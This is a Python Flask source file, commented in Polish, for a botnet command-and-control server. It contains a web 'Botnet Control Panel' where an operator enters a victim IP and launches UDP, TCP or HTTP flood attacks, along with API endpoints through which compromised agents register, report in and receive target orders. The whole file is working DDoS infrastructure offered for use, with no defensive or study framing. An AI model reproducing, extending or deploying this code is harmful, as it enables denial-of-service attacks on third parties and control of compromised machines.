import os

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import sqlite3
import json
from datetime import datetime, timedelta
import threading

app = Flask(__name__)
CORS(app)

# Baza danych SQLite
def init_db():
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    
    # Tabela agentów
    c.execute('''CREATE TABLE IF NOT EXISTS agents
                 (id TEXT PRIMARY KEY,
                  hostname TEXT,
                  platform TEXT,
                  ip TEXT,
                  bandwidth TEXT,
                  status TEXT,
                  last_seen TIMESTAMP,
                  registered TIMESTAMP)''')
    
    # Tabela ataków
    c.execute('''CREATE TABLE IF NOT EXISTS attacks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  target_ip TEXT,
                  started TIMESTAMP,
                  ended TIMESTAMP,
                  status TEXT,
                  threads INTEGER,
                  bots_count INTEGER)''')
    
    conn.commit()
    conn.close()

init_db()

# Panel webowy HTML
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Botnet Control Panel</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e27;
            color: #fff;
        }
        .header {
            background: linear-gradient(90deg, #1a1f3a 0%, #2a2f4a 100%);
            padding: 20px;
            border-bottom: 2px solid #4a6fa5;
        }
        .container {
            display: flex;
            min-height: 100vh;
        }
        .sidebar {
            width: 300px;
            background: #1a1f3a;
            padding: 20px;
            border-right: 1px solid #2a2f4a;
        }
        .content {
            flex: 1;
            padding: 20px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #1a1f3a;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #4a6fa5;
        }
        .stat-card.total { border-left-color: #4a6fa5; }
        .stat-card.online { border-left-color: #2ecc71; }
        .stat-card.attack { border-left-color: #e74c3c; }
        .stat-card.power { border-left-color: #f39c12; }
        
        .stat-number {
            font-size: 36px;
            font-weight: bold;
            margin: 10px 0;
        }
        .stat-label {
            color: #8f9bb3;
            font-size: 14px;
            text-transform: uppercase;
        }
        .attack-panel {
            background: #1a1f3a;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
        }
        input, select, button {
            background: #2a2f4a;
            border: 1px solid #3a3f5a;
            color: white;
            padding: 12px;
            margin: 5px;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            background: #4a6fa5;
            cursor: pointer;
            transition: all 0.3s;
            border: none;
        }
        button:hover {
            background: #5a7fb5;
            transform: translateY(-2px);
        }
        button.stop {
            background: #e74c3c;
        }
        button.stop:hover {
            background: #c0392b;
        }
        table {
            width: 100%;
            background: #1a1f3a;
            border-radius: 10px;
            overflow: hidden;
        }
        th {
            background: #2a2f4a;
            padding: 15px;
            text-align: left;
        }
        td {
            padding: 15px;
            border-bottom: 1px solid #2a2f4a;
        }
        .online { color: #2ecc71; font-weight: bold; }
        .offline { color: #e74c3c; font-weight: bold; }
        .attacking { color: #f39c12; font-weight: bold; animation: pulse 1s infinite; }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ BOTNET CONTROL PANEL ⚡</h1>
        <p>Total bots: <span id="totalBots">0</span> | Online: <span id="onlineBots">0</span> | Total power: <span id="totalPower">0</span> Mbps</p>
    </div>
    
    <div class="container">
        <div class="sidebar">
            <h2>🎯 KONTROLA ATAKU</h2>
            <div class="attack-panel">
                <h3>Nowy atak DDoS</h3>
                <input type="text" id="targetIP" placeholder="IP ofiary (np. 192.168.1.100)">
                <input type="number" id="duration" placeholder="Czas (sekundy)" value="300">
                <input type="number" id="threads" placeholder="Wątki na bota" value="100">
                <select id="attackType">
                    <option value="udp">UDP Flood (najszybszy)</option>
                    <option value="tcp">TCP Flood</option>
                    <option value="http">HTTP Flood</option>
                </select>
                <button onclick="startAttack()" style="width: 100%; margin-top: 10px;">▶ ROZPOCZNIJ ATAK</button>
                
                <hr style="margin: 20px 0; border-color: #2a2f4a;">
                
                <h3>Aktualny atak</h3>
                <div id="currentAttack">
                    <p>Brak aktywnego ataku</p>
                </div>
                <button class="stop" onclick="stopAttack()" style="width: 100%;">⏹ ZATRZYMAJ ATAK</button>
            </div>
            
            <h2>📊 STATYSTYKI</h2>
            <div style="background: #2a2f4a; padding: 15px; border-radius: 5px;">
                <p>Łączna moc: <span id="statPower">0</span> Mbps</p>
                <p>Pakiety/sek: <span id="statPackets">0</span></p>
                <p>Data: <span id="currentDate"></span></p>
            </div>
        </div>
        
        <div class="content">
            <div class="stats-grid">
                <div class="stat-card total">
                    <div class="stat-label">Wszystkie boty</div>
                    <div class="stat-number" id="statTotal">0</div>
                </div>
                <div class="stat-card online">
                    <div class="stat-label">Online</div>
                    <div class="stat-number" id="statOnline">0</div>
                </div>
                <div class="stat-card attack">
                    <div class="stat-label">Atakujące</div>
                    <div class="stat-number" id="statAttacking">0</div>
                </div>
                <div class="stat-card power">
                    <div class="stat-label">Moc (Mbps)</div>
                    <div class="stat-number" id="statPower2">0</div>
                </div>
            </div>
            
            <h2>🤖 AKTYWNI AGENCI</h2>
            <table>
                <thead>
                    <tr>
                        <th>ID Agenta</th>
                        <th>Hostname</th>
                        <th>Platforma</th>
                        <th>IP publiczne</th>
                        <th>Przepustowość</th>
                        <th>Status</th>
                        <th>Ostatni kontakt</th>
                    </tr>
                </thead>
                <tbody id="agentsTable"></tbody>
            </table>
            
            <h2 style="margin-top: 30px;">📋 HISTORIA ATAKÓW</h2>
            <table>
                <thead>
                    <tr>
                        <th>Cel (IP)</th>
                        <th>Czas ataku</th>
                        <th>Użyte boty</th>
                        <th>Status</th>
                    </tr>
                </thead>
                <tbody id="historyTable"></tbody>
            </table>
        </div>
    </div>
    
    <script>
        let currentAttack = null;
        
        function updateStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    // Update stat cards
                    document.getElementById('statTotal').textContent = data.total_bots;
                    document.getElementById('statOnline').textContent = data.online_bots;
                    document.getElementById('statAttacking').textContent = data.attacking_bots;
                    document.getElementById('statPower').textContent = data.total_power;
                    document.getElementById('statPower2').textContent = data.total_power;
                    document.getElementById('totalBots').textContent = data.total_bots;
                    document.getElementById('onlineBots').textContent = data.online_bots;
                    document.getElementById('totalPower').textContent = data.total_power;
                    document.getElementById('statPackets').textContent = data.packets_per_sec;
                    
                    // Update agents table
                    let html = '';
                    data.agents.forEach(agent => {
                        html += `<tr>
                            <td>${agent.id}</td>
                            <td>${agent.hostname}</td>
                            <td>${agent.platform}</td>
                            <td>${agent.ip}</td>
                            <td>${agent.bandwidth || '100Mbps'}</td>
                            <td class="${agent.status}">${agent.status}</td>
                            <td>${agent.last_seen}</td>
                        </tr>`;
                    });
                    document.getElementById('agentsTable').innerHTML = html;
                    
                    // Update current attack
                    if (data.current_attack) {
                        currentAttack = data.current_attack;
                        document.getElementById('currentAttack').innerHTML = `
                            <p><strong>IP:</strong> ${data.current_attack.target_ip}</p>
                            <p><strong>Rozpoczęty:</strong> ${data.current_attack.started}</p>
                            <p><strong>Użyte boty:</strong> ${data.current_attack.bots}</p>
                            <p><strong>Moc:</strong> ${data.current_attack.power} Mbps</p>
                        `;
                    } else {
                        document.getElementById('currentAttack').innerHTML = '<p>Brak aktywnego ataku</p>';
                    }
                    
                    // Update history
                    let historyHtml = '';
                    data.history.forEach(attack => {
                        historyHtml += `<tr>
                            <td>${attack.target_ip}</td>
                            <td>${attack.started}</td>
                            <td>${attack.bots}</td>
                            <td>${attack.status}</td>
                        </tr>`;
                    });
                    document.getElementById('historyTable').innerHTML = historyHtml;
                    
                    // Update date
                    document.getElementById('currentDate').textContent = new Date().toLocaleString();
                });
        }
        
        function startAttack() {
            const targetIP = document.getElementById('targetIP').value;
            const duration = document.getElementById('duration').value;
            const threads = document.getElementById('threads').value;
            const attackType = document.getElementById('attackType').value;
            
            if (!targetIP) {
                alert('Podaj IP ofiary!');
                return;
            }
            
            fetch('/api/attack/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    target_ip: targetIP,
                    duration: parseInt(duration),
                    threads: parseInt(threads),
                    type: attackType
                })
            })
            .then(r => r.json())
            .then(() => {
                alert('Atak rozpoczęty!');
                updateStats();
            });
        }
        
        function stopAttack() {
            fetch('/api/attack/stop', {method: 'POST'})
            .then(() => {
                alert('Atak zatrzymany');
                updateStats();
            });
        }
        
        // Update co 3 sekundy
        setInterval(updateStats, 3000);
        updateStats();
    </script>
</body>
</html>
'''

# API ENDPOINTS
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/register', methods=['POST'])
def register_agent():
    data = request.json
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    
    c.execute('''INSERT OR REPLACE INTO agents 
                 (id, hostname, platform, ip, bandwidth, status, last_seen, registered)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
              (data['id'], data['hostname'], data['platform'], 
               data['ip'], data.get('bandwidth', '100Mbps'), 'online',
               datetime.now(), datetime.now()))
    
    conn.commit()
    conn.close()
    return jsonify({'status': 'registered'})

@app.route('/api/heartbeat/<agent_id>', methods=['POST'])
def heartbeat(agent_id):
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    
    c.execute('''UPDATE agents SET last_seen = ?, status = 'online'
                 WHERE id = ?''', (datetime.now(), agent_id))
    
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})

@app.route('/api/orders/<agent_id>')
def get_orders(agent_id):
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    
    # Sprawdź czy jest aktywny atak
    c.execute('''SELECT * FROM attacks WHERE status = 'active' 
                 ORDER BY started DESC LIMIT 1''')
    attack = c.fetchone()
    
    response = {}
    if attack:
        response['target_ip'] = attack[1]
        response['threads'] = attack[5]
        response['duration'] = 300  # domyślnie 5 minut
    else:
        response['stop'] = True
    
    conn.close()
    return jsonify(response)

@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    data = request.json
    
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    
    # Zatrzymaj poprzednie ataki
    c.execute('''UPDATE attacks SET status = 'stopped', ended = ?
                 WHERE status = 'active' ''', (datetime.now(),))
    
    # Rozpocznij nowy
    c.execute('''INSERT INTO attacks 
                 (target_ip, started, status, threads)
                 VALUES (?, ?, ?, ?)''',
              (data['target_ip'], datetime.now(), 'active', data['threads']))
    
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'attack_started'})

@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    
    c.execute('''UPDATE attacks SET status = 'stopped', ended = ?
                 WHERE status = 'active' ''', (datetime.now(),))
    
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'attack_stopped'})

@app.route('/api/stats')
def get_stats():
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    
    # Total agents
    c.execute('SELECT COUNT(*) FROM agents')
    total = c.fetchone()[0]
    
    # Online agents (last 60 seconds)
    threshold = datetime.now() - timedelta(seconds=60)
    c.execute('SELECT COUNT(*) FROM agents WHERE last_seen > ?', (threshold,))
    online = c.fetchone()[0]
    
    # Active attack
    c.execute('''SELECT target_ip, started, threads FROM attacks 
                 WHERE status = 'active' ORDER BY started DESC LIMIT 1''')
    active_attack = c.fetchone()
    
    # Attacking bots
    attacking = online if active_attack else 0
    
    # Total power (Mbps) - zakładając 100Mbps na bota
    total_power = online * 100
    
    # All agents
    c.execute('''SELECT id, hostname, platform, ip, bandwidth, status, last_seen 
                 FROM agents ORDER BY last_seen DESC''')
    agents = []
    for row in c.fetchall():
        agents.append({
            'id': row[0],
            'hostname': row[1],
            'platform': row[2],
            'ip': row[3],
            'bandwidth': row[4],
            'status': 'online' if row[5] == 'online' and row[6] > threshold else 'offline',
            'last_seen': row[6].strftime('%H:%M:%S') if isinstance(row[6], datetime) else str(row[6])
        })
    
    # Attack history
    c.execute('''SELECT target_ip, started, ended, status, 
                 (SELECT COUNT(*) FROM agents) as bots
                 FROM attacks ORDER BY started DESC LIMIT 10''')
    history = []
    for row in c.fetchall():
        history.append({
            'target_ip': row[0],
            'started': row[1].strftime('%H:%M:%S') if isinstance(row[1], datetime) else str(row[1]),
            'ended': row[2].strftime('%H:%M:%S') if isinstance(row[2], datetime) else 'ongoing',
            'status': row[3],
            'bots': row[4]
        })
    
    conn.close()
    
    return jsonify({
        'total_bots': total,
        'online_bots': online,
        'attacking_bots': attacking,
        'total_power': total_power,
        'packets_per_sec': online * 10000,
        'agents': agents,
        'history': history,
        'current_attack': {
            'target_ip': active_attack[0] if active_attack else None,
            'started': active_attack[1].strftime('%H:%M:%S') if active_attack else None,
            'threads': active_attack[2] if active_attack else 0,
            'bots': online,
            'power': online * 100
        } if active_attack else None
    })

# ... (reszta twojego kodu) ...

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)